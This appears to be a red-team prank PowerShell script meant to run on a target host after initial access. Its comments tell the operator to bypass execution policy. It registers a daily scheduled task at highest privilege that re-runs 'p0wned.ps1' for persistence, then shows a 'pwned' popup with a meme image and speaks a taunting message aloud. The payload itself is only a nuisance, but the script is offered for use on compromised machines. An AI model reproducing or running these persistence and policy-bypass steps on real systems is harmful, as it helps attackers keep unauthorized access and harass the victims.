# After gaining intial access and ensuring you can
# Transfer the gif or image to the target host,
# You will need to either Set-ExecutionPolicy Bypass
# Or Remotesigned in order to drop the .ps1 on the host and run it
# Alternatively, if a remote shell is established or PSSession,
# You can copy and paste the script into the terminal but the "Pop-pup"
# section of the script will immediately execute.

# In any case, depending on security posture/budget/competency/experience/knowledge of the local security team
# You may not be able to run this anyway...
# But if you can, a lul is a win. 

# After intial access and ability to set execution policy has been obtained
Set-ExecutionPolicy RemoteSigned
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\p0wned.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At 3:00PM
$principal = New-ScheduledTaskPrincipal -UserId 'Domain\User' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
Register-ScheduledTask 'memetask' -InputObject $task


# The above is optional for persistent lulz
# Or run the script standalone to let the user
# Know Red Team has won...

Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Text-to-Speech setup
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer

# First, we create out Form object to size and place out text and
# Additional objects in
# You can adjust the size as needed
$form = New-Object System.Windows.Forms.Form
$form.Text = "Alert"
$form.Size = New-Object System.Drawing.Size(300, 200)
$form.StartPosition = "CenterScreen"

# Here, we create out labeling for the form
$label = New-Object System.Windows.Forms.Label
$label.Text = "pwned"
$label.Size = New-Object System.Drawing.Size(200, 20)
$label.Location = New-Object System.Drawing.Point(150, 30)
$form.Controls.Add($label)

# Add your meme or gif here for trolling and profit
$imagePath = "D:\Apps\Notepad++\peeposmile.png"
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
$pictureBox.SizeMode = "StretchImage"
$pictureBox.Size = New-Object System.Drawing.Size(100, 100)
$pictureBox.Location = New-Object System.Drawing.Point(30, 30)
$form.Controls.Add($pictureBox)

# This will create a generic Button on your form
# You can adjust dimensions and styling as you see fit
$okButton = New-Object System.Windows.Forms.Button
$okButton.Text = "OK"
$okButton.Location = New-Object System.Drawing.Point(150, 100)
$okButton.Add_Click({ $form.Close() })
$form.Controls.Add($okButton)

# This will pop the display in the user's GUI
$form.ShowDialog()

# Reads your custom message aloud
# You can equally change this as needed
$speak.Speak("You have been owned, and that is just sadge, lulz, poggers, feelsbadman")
